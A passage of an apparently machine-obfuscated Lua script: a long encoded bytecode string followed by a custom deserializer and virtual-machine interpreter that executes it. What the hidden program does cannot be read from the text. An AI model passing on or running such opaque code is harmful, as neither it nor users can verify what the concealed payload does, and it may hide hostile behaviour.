ZHGfIGFgGpHdlHgjHc`H[]HMNHg\\HdHHiFHdLHd_HiGHkKHMNHkWHaIH^[HeeHMNHMJIGGJHdkHIJIGGZH\\JHkOH[^HeoHchIGGZHNHH[hHbNHcbH\\JHNHHeoHIJHNHHg\\HjlIGGjHfmHMOHp]HO\\IGGZHbNHOlH_iHcbHbNHYlHdlHM]IGGFHMKH\\dH[oHcbHMiHflIGH^HiHHfhHIJHOlHccHcbHOlHNfHMNIGHaHNXHOlIGHaHXKHdZIGHeHdMHMKH_iHcfHMKHjlH_iH_iHZiHjpHYlHk`H^[H_iHd^IGHgHIJHY[IGHMIGH[HIJHimIGIFHIJHM]HMiHchHHeHM]HbNH^fH]eHG_IGGlHhkHe^IGIiIGGJHM]HObHk`H[oH[]HgIHiIHfhIGIFHXJH`KHZmHJoHLYHJoHK]H`WH\\hHMcH`FGbGcGJHgpH[`H[bHZ[Ho]HfJH\\nHo\\H_aHaIH\\FGiH\\HHZ[H\\jHpkH\\LH\\NH\\WH\\YIGIFH\\fH\\_GOH\\aH_aH\\dIGKXH\\hIGKJHeeIGJmH\\pHMOH]HH]JH\\LH]MH[^Hl`HIJHGlIGHcHd_HkbHMKHIIHhXHeZIGLFHgIIGKlHjhHc`IGI[HfhHjpHhoH^[HMNHbJIGGGHMKIGHIHMKH[oIGG\\HkXH^[HjlH\\JIGLeHIJHcbH[oIGG`IGGZH[oIGGeHggHMOIGL^IGG[IGIpHenIGLcHMKIGGpHM]IGGhHcnHNHIGG^IGIoHfJIGIoIGL]IGG]IGMJHiFHMiHjpH[hIGIdHf_IGMIIGIpHbNH\\dHIJH[hIGI\\IGM]H[oH[hIGGdIGMXH[^HMNIGGmHMKIGKlIGGOHIJHHNHG`HcnH[oHOKH\\JHeMHddIGJOHg\\HK^HcdHHbHgkIGIKHhFHjpHjnHhHHd^HjpIGLLIGNKHccHhiIGLWHkLH^[HchHhoIGNcHfhHjlHd^H[]HemHMNIGGOHXeIGFoHe^IGNlIGGnIGM[IGNpIGL_IGGJH^[HO\\IGJLIGNiHkLHchHNHHkNIGMhIGLbHcnHZiHhbHe`IGOiHf]HcfIGMlHglIGNMIGLiIGIpHckHcnIGLIHcmIGLHHfcH[oHfeIGWIH[oIGWKHfWIGKpIGWNIGMGHfKIGWJIGLGHe`IGWKIGIbIGNNHkXHclH[oHgjHjhHeZIGWiIGOmIGGJHhKHa[HNHIGIdHk`H\\JIGJMHMKIGN[HfpIGG`H[^HILIGLlIGHcHY[H[hHeoHjpHbNH_iH^[IGMiHiGHbNIGX\\HMKHM]H`dH[^HbNHd^HMOIGJIHjiHfmH^fH^[HM]Hd^HjlHMiH[]Ha[HdNH_iIGGnHdcIGIMIGHbHMOHMiIGLNIGYHHfmHNXHjlHOlHO\\HNfHMOHOlIGXjIGIHIGO]H[^IGYMHjmH[oHYlHcjHhOH^fH_GHg]HhZIGO\\HMOIGZGHe]HH^IGLgHIJIGXoHf]IGXKHIJHXKIGGIHNXHimH^[HNfIGX_H[^IGZZHiFIGGZHXKHY[HcfHjlHimHMNHNXHcbHXKHZiHimIGZdHIJHk`HHoH[^IGZ]IGZcHMKHimHY[HdGHjlHY[HMNHIFIGZMIGWdHZiHY[IGGZHimIG[GH[^HY[IGM[IGGZHY[HY[HclHjpHcfHd\\IGNaHIJHZiHMNIGFOHIJHcfIGMjIGI^IG[mIG\\FIGM\\IG\\IIG[aHekIGLoIG\\LHcfHY[IGLFHjpHZiIG[kIGOaHk`HMNIGKjHZiIG\\HHcfHZiHZiIGGZHcfIG\\NHMKHZiIG[dIG\\kIG\\IHdcHjpHk`IG\\^HjlIG[HHMNHXeHMOHk`IGYGHMKHk`Hk`HWWHjpHdGHHYHe]Hk`HdGIGYJIG\\nHZiHk`IGGZIG]cHIJIG[HIG]MIG\\WIGGZHk`HY[HgjHcbHk`HZiH_iIG]kIG[FIG]gH[^IG]hIG[KIG^JHY[HmYHcbIG[HHZiHOlIGGZIG[HHk`HH\\H[^He`IGLpHdGHY[HH]IG[[HdGHZiIGMmHMKHdGIG^^H[^IG[ZIG\\mHIJIG[ZHY[IGZLHcbIG[ZHZiHbNIGGZIG[ZIG^lHf[IG]jHMKHclHY[HH_IG[[HclHZiHMiIGGZHclIG_OHMKIG\\^IGLpHd\\HY[HgGHjpIGLFIG\\^HjpHgmIGOYIGNiHgmIGJOHIJIGLFIG\\HHd\\HZiIGLFIGGZHd\\IG\\jIG`HIG_XIG`XHY[HH`IGZWIGNiIG_oHgmHgmIG`\\HcbIGLFHZiHgmIGGZIGLFIG_cIGOaIG^MHgmHY[HHaH[^HdcIGXgHjlHXeIG[oIG`oHjmIG[[HgmHZiHdcIGGZHgmIG`iHNfIG_nIGNKIGNMHXKIGaIHfmHa[HXKIGGFHa[IGZOHjpHgGIGN_IGZ[HIJHHcHe]IGHiHe]IGZbIGLpIGZeIG\\KIGZhHkLIGZkHMKIGZmIGWdIGZpIG\\NHO\\IG[JIGHIIG`nIG[MHIJIG[OHMKIG[XIG^pIG[[HimIG[]IG\\LIG[`IG^JHMOIG[cIG^MIG[fHIJIG[hHMKIG[jHkJIG\\JIGa_IGbmIGaKHcbHY[HZiHcfHGiHGjIG\\MIGbfHGmIG\\KIG^oIG\\YHIJIG`nHMOHZiIGaFIG]WHkLIG[pIG\\cIGJFIGcGIG\\fIG\\XIG^IIG^_HMOHNfHeiIGNLIGZYIGcbHiKIGZMIGabIGa\\IGZMHchHHdIGNKHG^IGZMHa[HMJHhNIGZWIGFpIGZFHdmH[^IGZJIGZOIGGJIGYKIGNZIGN`HIJ");local H,I,G,e=1,f and f.bxor or function(H,G)local e,I=1,0 while H>0 and G>0 do local l,n=H%2,G%2 if l~=n then I=I+e end H,G,e=(H-l)/2,(G-n)/2,e*2 end if H<G then H=G end while H>0 do local G=H%2 if G>0 then I=I+e end H,e=(H-G)/2,e*2 end return I end,112,function(G,H,e)if e then local H=(G/2^(H-1))%2^((e-1)-(H-1)+1);return H-H%1;else local H=2^(H-1);return(G%(H+H)>=H)and 1 or 0;end;end local G,f,d=function()local l,e,c,n=n(i,H,H+3);l,e,c,n=I(l,G),I(e,G),I(c,G),I(n,G)H=H+4;return(n*16777216)+(c*65536)+(e*256)+l;end,function()local G=I(n(i,H,H),G);H=H+1;return G;end,function()local l,e=n(i,H,H+2);l,e=I(l,G),I(e,G)H=H+2;return(e*256)+l;end;local function Z()local I=G();local H=G();local l=1;local I=(e(H,1,20)*(2^32))+I;local G=e(H,21,31);local H=((-1)^e(H,32));if(G==0)then if(I==0)then return H*0;else G=1;l=0;end;elseif(G==2047)then return(I==0)and(H*(1/0))or(H*(0/0));end;return h(H,G-1023)*(l+(I/(2^52)));end;local H,n=G,function(e)local c;if(not e)then e=G();if(e==0)then return'';end;end;c=l(i,H,H+e-1);H=H+e;local G={}for H=1,#c do G[H]=M(I(n(l(c,H,H)),112))end return O(G);end;local H,M=G,function(...)return{...},a('#',...)end local function O()local c,l,H={},{},{};local o={c,l,nil,H};local H,I=G(),{}for e=1,H do local G,H=f();if(G==3)then H=(f()~=0);elseif(G==2)then H=Z();elseif(G==1)then H=n();end;I[e]=H;end;o[3]=f();for H=1,G()do l[H-1]=O();end;for o=1,G()do local H=f();if(e(H,1,1)==0)then local l,n,H=e(H,2,3),e(H,4,6),{d(),d(),nil,nil};if(l==0)then H[3]=d();H[4]=d();elseif(l==1)then H[3]=G();elseif(l==2)then H[3]=G()-(2^16)elseif(l==3)then H[3]=G()-(2^16)H[4]=d();end;if(e(n,1,1)==1)then H[2]=I[H[2]]end if(e(n,2,2)==1)then H[3]=I[H[3]]end if(e(n,3,3)==1)then H[4]=I[H[4]]end c[o]=H;end end;return o;end;local function i(H,d,n)local G,e,H=H[1],H[2],H[3];return function(...)local I,M,l,H,G,a,N,O,h,f,e=G,e,H,M,1,-1,{},{...},a('#',...)-1,{},{};for H=0,h do if(H>=l)then N[H-l]=O[H+1];else e[H]=O[H+1];end;end;local H=h-l+1 local H;local l;while true do H=I[G];l=H[1];if l<=35 then if l<=17 then if l<=8 then if l<=3 then if l<=1 then if l>0 then e[H[2]]=e[H[3]][H[4]];else e[H[2]]=e[H[3]];end;elseif l>2 then e[H[2]]={};else local f;local l;local i;local c;e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];c=H[3];i=e[c]for H=c+1,H[4]do i=i..e[H];end;e[H[2]]=i;G=G+1;H=I[G];e[H[2]]=d[H[3]];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]]=d[H[3]];G=G+1;H=I[G];l=H[2];c=e[H[3]];e[l+1]=c;e[l]=c[H[4]];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];l=H[2];f=e[l];for H=l+1,H[3]do o(f,e[H])end;end;elseif l<=5 then if l==4 then if not e[H[2]]then G=G+1;else G=H[3];end;else e[H[2]]=i(M[H[3]],nil,n);end;elseif l<=6 then local G=H[2]e[G](c(e,G+1,H[3]))elseif l==7 then if(e[H[2]]~=H[4])then G=G+1;else G=H[3];end;else local o=M[H[3]];local c;local l={};c=t({},{__index=function(G,H)local H=l[H];return H[1][H[2]];end,__newindex=function(e,H,G)local H=l[H]H[1][H[2]]=G;end;});for n=1,H[4]do G=G+1;local H=I[G];if H[1]==53 then l[n-1]={e,H[3]};else l[n-1]={d,H[3]};end;f[#f+1]=l;end;e[H[2]]=i(o,c,n);end;elseif l<=12 then if l<=10 then if l>9 then e[H[2]][H[3]]=e[H[4]];else local H=H[2]e[H]=e[H]()end;elseif l>11 then local I=e[H[4]];if not I then G=G+1;else e[H[2]]=I;G=H[3];end;else local l;l=H[2]e[l](c(e,l+1,H[3]))G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];end;elseif l<=14 then if l>13 then local G=H[2]e[G]=e[G](c(e,G+1,H[3]))else local c;local l;e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=d[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=d[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=d[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];l=H[2];c=e[l];for H=l+1,H[3]do o(c,e[H])end;end;elseif l<=15 then local l;local c;e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];c=H[3];l=e[c]for H=c+1,H[4]do l=l..e[H];end;e[H[2]]=l;G=G+1;H=I[G];do return e[H[2]]end G=G+1;H=I[G];do return end;elseif l>16 then do return end;else e[H[2]]=H[3];end;elseif l<=26 then if l<=21 then if l<=19 then if l==18 then local H=H[2]e[H]=e[H](e[H+1])else do return end;end;elseif l==20 then local G=H[2];do return e[G](c(e,G+1,H[3]))end;else for H=H[2],H[3]do e[H]=nil;end;end;elseif l<=23 then if l==22 then local n;local l;e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];l=H[2];n=e[H[3]];e[l+1]=n;e[l]=n[H[4]];else e[H[2]]=n[H[3]];end;elseif l<=24 then e[H[2]]=i(M[H[3]],nil,n);elseif l>25 then local H=H[2]e[H](e[H+1])else local H=H[2]e[H](e[H+1])end;elseif l<=30 then if l<=28 then if l==27 then G=H[3];else e[H[2]]=H[3];end;elseif l==29 then if not e[H[2]]then G=G+1;else G=H[3];end;else local G=H[2]local l,I={e[G](e[G+1])},0;for H=G,H[4]do I=I+1;e[H]=l[I];end end;elseif l<=32 then if l==31 then if e[H[2]]then G=G+1;else G=H[3];end;else local H=H[2]e[H]=e[H]()end;elseif l<=33 then local n;local l;e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](c(e,l+1,H[3]))G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2];n=e[H[3]];e[l+1]=n;e[l]=n[H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];l=H[2]e[l]=e[l]()elseif l>34 then local I=e[H[4]];if not I then G=G+1;else e[H[2]]=I;G=H[3];end;else local d;local l;l=H[2]e[l]=e[l](c(e,l+1,H[3]))G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];l=H[2];d=e[H[3]];e[l+1]=d;e[l]=d[H[4]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](c(e,l+1,H[3]))G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];if e[H[2]]then G=G+1;else G=H[3];end;end;elseif l<=53 then if l<=44 then if l<=39 then if l<=37 then if l>36 then local o;local l;e[H[2]]=n[H[3]];G=G+1;H=I[G];l=H[2];o=e[H[3]];e[l+1]=o;e[l]=o[H[4]];G=G+1;H=I[G];e[H[2]]=d[H[3]];G=G+1;H=I[G];l=H[2];do return e[l](c(e,l+1,H[3]))end;G=G+1;H=I[G];l=H[2];do return c(e,l,a)end;G=G+1;H=I[G];do return end;else e[H[2]][H[3]]=e[H[4]];end;elseif l>38 then local H=H[2]e[H]=e[H](e[H+1])else local H=H[2];do return c(e,H,a)end;end;elseif l<=41 then if l==40 then e[H[2]]={};else local i;local d;local l;e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];l=H[2];d=e[H[3]];e[l+1]=d;e[l]=d[H[4]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](c(e,l+1,H[3]))G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];l=H[2];i=e[l];for H=l+1,H[3]do o(i,e[H])end;end;elseif l<=42 then e[H[2]][H[3]]=H[4];elseif l==43 then e[H[2]]=d[H[3]];else local l;e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];end;elseif l<=48 then if l<=46 then if l>45 then G=H[3];else local d;local l;e[H[2]]=n[H[3]];G=G+1;H=I[G];l=H[2];d=e[H[3]];e[l+1]=d;e[l]=d[H[4]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](c(e,l+1,H[3]))G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];l=H[2];d=e[H[3]];e[l+1]=d;e[l]=d[H[4]];G=G+1;H=I[G];e[H[2]]=H[3];G=G+1;H=I[G];l=H[2]e[l]=e[l](c(e,l+1,H[3]))G=G+1;H=I[G];e[H[2]]=n[H[3]];G=G+1;H=I[G];l=H[2];d=e[H[3]];e[l+1]=d;e[l]=d[H[4]];end;elseif l==47 then local G=H[2];local I=e[G];for H=G+1,H[3]do o(I,e[H])end;else if(e[H[2]]==e[H[4]])then G=G+1;else G=H[3];end;end;elseif l<=50 then if l==49 then e[H[2]][H[3]]=H[4];else do return e[H[2]]end end;elseif l<=51 then e[H[2]]=d[H[3]];elseif l>52 then e[H[2]]=e[H[3]];else local n;local l;e[H[2]]={};G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];e[H[2]]=e[H[3]];G=G+1;H=I[G];e[H[2]]=e[H[3]][H[4]];G=G+1;H=I[G];l=H[2]e[l]=e[l](e[l+1])G=G+1;H=I[G];e[H[2]][H[3]]=e[H[4]];G=G+1;H=I[G];e[H[2]][H[3]]=H[4];G=G+1;H=I[G];l=H[2];n=e[l];for H=l+1,H[3]do o(n,e[H])end;end;elseif l<=62 then if l<=57 then if l<=55 then if l==54 then for H=H[2],H[3]do e[H]=nil;end;else if(e[H[2]]==e[H[4]])then G=G+1;else G=H[3];end;end;elseif l>56 then do return e[H[2]]end else local G=H[2];local I=e[G];for H=G+1,H[3]do o(I,e[H])end;end;elseif l<=59 then if l==58 then local I=H[3];local G=e[I]for H=I+1,H[4]do G=G..e[H];end;e[H[2]]=G;else local G=H[2];do return e[G](c(e,G+1,H[3]))end;end;elseif l<=60 then local I=H[2];local G=e[H[3]];e[I+1]=G;e[I]=G[H[4]];elseif l>61 then local I=H[2]local l,G={e[I](e[I+1])},0;for H=I,H[4]do G=G+1;e[H]=l[G];end else local G=H[2]e[G](c(e,G+1,H[3]))end;elseif l<=66 then if l<=64 then if l>63 then if e[H[2]]then G=G+1;else G=H[3];end;else local H=H[2];do return c(e,H,a)end;end;elseif l==65 then local o=M[H[3]];local c;local l={};c=t({},{__index=function(G,H)local H=l[H];return H[1][H[2]];end,__newindex=function(e,H,G)local H=l[H]H[1][H[2]]=G;end;});for n=1,H[4]do G=G+1;local H=I[G];if H[1]==53 then l[n-1]={e,H[3]};else l[n-1]={d,H[3]};end;f[#f+1]=l;end;e[H[2]]=i(o,c,n);else local I=H[3];local G=e[I]for H=I+1,H[4]do G=G..e[H];end;e[H[2]]=G;end;elseif l<=68 then if l==67 then e[H[2]]=n[H[3]];else if(e[H[2]]~=H[4])then G=G+1;else G=H[3];end;end;elseif l<=69 then local G=H[2];local I=e[H[3]];e[G+1]=I;e[G]=I[H[4]];elseif l==70 then local G=H[2]e[G]=e[G](c(e,G+1,H[3]))else e[H[2]]=e[H[3]][H[4]];end;G=G+1;end;end;end;return i(O(),{},N)(...);end)(...)
